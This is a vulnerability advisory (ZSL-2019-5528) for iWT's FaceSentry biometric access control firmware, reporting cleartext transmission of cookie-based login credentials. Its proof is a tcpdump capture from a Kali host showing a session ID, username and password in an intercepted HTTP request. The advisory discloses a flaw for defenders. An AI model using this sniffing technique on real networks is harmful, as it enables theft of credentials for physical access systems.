@@ -1,0 +1,88 @@
+
+FaceSentry Access Control System 6.4.8 Authentication Credentials MiTM Disclosure
+
+
+Vendor: iWT Ltd.
+Product web page: http://www.iwt.com.hk
+Affected version: Firmware 6.4.8 build 264 (Algorithm A16)
+                  Firmware 5.7.2 build 568 (Algorithm A14)
+                  Firmware 5.7.0 build 539 (Algorithm A14)
+
+Summary: FaceSentry 5AN is a revolutionary smart identity
+management appliance that offers entry via biometric face
+identification, contactless smart card, staff ID, or QR-code.
+The QR-code upgrade allows you to share an eKey with guests
+while you're away from your Office and monitor all activity
+via the web administration tool. Powered by standard PoE
+(Power over Ethernet), FaceSEntry 5AN can be installed in
+minutes with only 6 screws. FaceSentry 5AN is a true enterprise
+grade access control or time-and-attendance appliance.
+
+Desc: The application suffers from a cleartext transmission of
+sensitive information. This allows a remote attacker to intercept
+the HTTP Cookie authentication credentials via a man-in-the-middle
+attack.
+
+Tested on: Linux 4.14.18-sunxi (armv7l) Ubuntu 16.04.4 LTS (Xenial Xerus)
+           Linux 3.4.113-sun8i (armv7l)
+           PHP/7.0.30-0ubuntu0.16.04.1
+           PHP/7.0.22-0ubuntu0.16.04.1
+           lighttpd/1.4.35
+           Armbian 5.38
+           Sunxi Linux (sun8i generation)
+           Orange Pi PC +
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5528
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5528.php
+
+
+28.05.2019
+
+--
+
+
+root@kali:~# tcpdump -i eth0 -X
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+<..snip..>
+<..snip..>
+12:30:11.895004 IP kali.41495 > 192-168-11-1.zslab35.http: Flags [P.], seq 1:490, ack 1, win 229, options [nop,nop,TS val 4499898 ecr 1786936921], length 489: HTTP: POST /tcpPortTest.php HTTP/1.1
+  0x0000:  4500 021d a86c 4000 4006 13f6 c0a8 0151  E....l@.@......Q
+  0x0010:  2ac8 8fb7 a217 0050 bc23 011f 086b 09a9  *......P.#...k..
+  0x0020:  8018 00e5 7e88 0000 0101 080a 0044 a9ba  ....~........D..
+  0x0030:  6a82 7e59 504f 5354 202f 7463 7050 6f72  j.~YPOST./tcpPor
+  0x0040:  7454 6573 742e 7068 7020 4854 5450 2f31  tTest.php.HTTP/1
+  0x0050:  2e31 0d0a 5573 6572 2d41 6765 6e74 3a20  .1..User-Agent:.
+  0x0060:  4d6f 7a69 6c6c 612f 352e 3020 2858 3131  Mozilla/5.0.(X11
+  0x0070:  3b20 4c69 6e75 7820 7838 365f 3634 3b20  ;.Linux.x86_64;.
+  0x0080:  7276 3a34 352e 3029 2047 6563 6b6f 2f32  rv:45.0).Gecko/2
+  0x0090:  3031 3030 3130 3120 4669 7265 666f 782f  0100101.Firefox/
+  0x00a0:  3435 2e30 0d0a 4163 6365 7074 3a20 7465  45.0..Accept:.te
+  0x00b0:  7874 2f68 746d 6c2c 6170 706c 6963 6174  xt/html,applicat
+  0x00c0:  696f 6e2f 7868 746d 6c2b 786d 6c2c 6170  ion/xhtml+xml,ap
+  0x00d0:  706c 6963 6174 696f 6e2f 786d 6c3b 713d  plication/xml;q=
+  0x00e0:  302e 392c 2a2f 2a3b 713d 302e 380d 0a41  0.9,*/*;q=0.8..A
+  0x00f0:  6363 6570 742d 4c61 6e67 7561 6765 3a20  ccept-Language:.
+  0x0100:  656e 2d55 532c 656e 3b71 3d30 2e35 0d0a  en-US,en;q=0.5..
+  0x0110:  5265 6665 7265 723a 2068 7474 703a 2f2f  Referer:.http://
+  0x0120:  3139 322e 3136 382e 3131 2e31 2f74 6370  192.168.11.1/tcp
+  0x0130:  506f 7274 5465 7374 2e70 6870 3f0d 0a43  PortTest.php?..C
+  0x0140:  6f6f 6b69 653a 2050 4850 5345 5353 4944  ookie:.PHPSESSID
+  0x0150:  3d32 3174 3469 6466 3135 666e 6b64 3631  =21t4idf15fnkd61
+  0x0160:  7265 7271 6c39 616c 346e 333b 2075 7365  rerql9al4n3;.use
+  0x0170:  726e 616d 653d 7573 6572 3b20 7061 7373  rname=user;.pass
+  0x0180:  776f 7264 3d31 3233 0d0a 436f 6e6e 6563  word=123..Connec
+  0x0190:  7469 6f6e 3a20 6b65 6570 2d61 6c69 7665  tion:.keep-alive
+  0x01a0:  0d0a 436f 6e74 656e 742d 5479 7065 3a20  ..Content-Type:.
+  0x01b0:  6170 706c 6963 6174 696f 6e2f 782d 7777  application/x-ww
+  0x01c0:  772d 666f 726d 2d75 726c 656e 636f 6465  w-form-urlencode
+  0x01d0:  640d 0a43 6f6e 7465 6e74 2d4c 656e 6774  d..Content-Lengt
+  0x01e0:  683a 2032 380d 0a48 6f73 743a 2031 3932  h:.28..Host:.192
+  0x01f0:  2e31 3638 2e31 312e 310d 0a0d 0a73 7472  .168.11.1....str
+  0x0200:  496e 4950 3d31 2e33 2e33 2e37 2673 7472  InIP=1.3.3.7&str
+  0x0210:  496e 506f 7274 3d38 30                   InPort=80
